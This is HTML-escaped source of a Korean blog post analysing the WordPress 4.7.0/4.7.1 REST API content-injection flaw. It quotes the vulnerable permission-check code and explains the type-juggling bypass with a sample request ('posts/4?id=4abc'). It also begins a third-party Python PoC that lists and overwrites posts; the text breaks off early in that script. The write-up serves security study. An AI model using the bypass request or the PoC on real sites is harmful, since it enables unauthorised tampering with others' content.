-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update_item_permissions_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_post_type_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;post_type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;check_update_permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_edit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to edit this post.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'author'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_current_user_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'author'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;current_user_can&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;cap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;edit_others_posts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_edit_others'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to update posts as this user.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sticky'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;current_user_can&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;cap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;edit_others_posts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_assign_sticky'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to make posts sticky.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;check_assign_terms_permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_assign_term'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to assign the provided terms.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;사용자가 게시물 수정 요청을 보내면 해당 게시물에 대한 권한을 체크하기 위해 update_item_permissions_check 함수를 콜백하게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;공격자가 ./wp-json/wp/v2/posts/4?id=4abc와 같이 요청을 보내는 경우 4abc에 해당하는 게시물이 없어 권한체크를 하는 if문을 벗어나 return true결과를 나타내어 권한체크 로직을 우회할 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update_item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    …&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;매개변수로 전달되는 $request의 id 값을 int형으로 형변환(Cascading)을 하는 부분이 있는데, $request[‘id’]의 값 중 숫자이외에 문자, 문자열이 포함되는 경우 삭제가 됩니다. 이는 PHP의 형변환 규칙으로 인해 문자열을 정수형으로 형변환 시 문자가 나오는 지점부터 데이터가 손실이 발생하게 됩니다. 
- 
-간단하게 PHP 문자열 데이터를 정수형으로 형변환하는 코드와 그 결과를 아래의 코드와 그림으로 결과를 알아볼 수 있습니다.&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$test&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;4abc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$modify_test&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$modify_test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_4.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-4]
-  PHP 정수형 형변환 테스트
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;서버IP/index.php/wp-json/wp-v2/posts/4?id=4abc와 같이 요청을 하게 되면 게시물 수정 권한 체크 부분에서는 존재하지 않는 게시물이기에 권한체크로직을 우회하고, 바로 다음 콜랙 함수인 update_item 함수에서는 정수형으로 형변환이 일어나 4의 게시물을 변경하는 작업을 수행하게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;다음은 해당 privilege Escalation / Content Injection 취약점의 POC(Proof of Concept) 코드입니다.&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 2017 - @leonjza&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Wordpress 4.7.0/4.7.1 Unauthenticated Content Injection PoC&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Full bug description: https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Usage example:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# List available posts:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# $ python inject.py http://localhost:8070/&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Discovering API Endpoint&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * API lives at: http://localhost:8070/wp-json/&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Getting available posts&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#  - Post ID: 1, Title: test, Url: http://localhost:8070/archives/1&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Update post with content from a file:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# $ cat content&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# foo&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# $ python inject.py http://localhost:8070/ 1 content&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Discovering API Endpoint&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * API lives at: http://localhost:8070/wp-json/&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Updating post 1&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Post updated. Check it out at http://localhost:8070/archives/1&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# * Update complete!&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lxml&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;reload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setdefaultencoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_api_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wordpress_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wordpress_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'//link[@rel=&quot;https://api.w.org/&quot;]/@href'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# check if we have permalinks&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rest_route'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' ! Warning, looks like permalinks are not enabled. This might not work!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
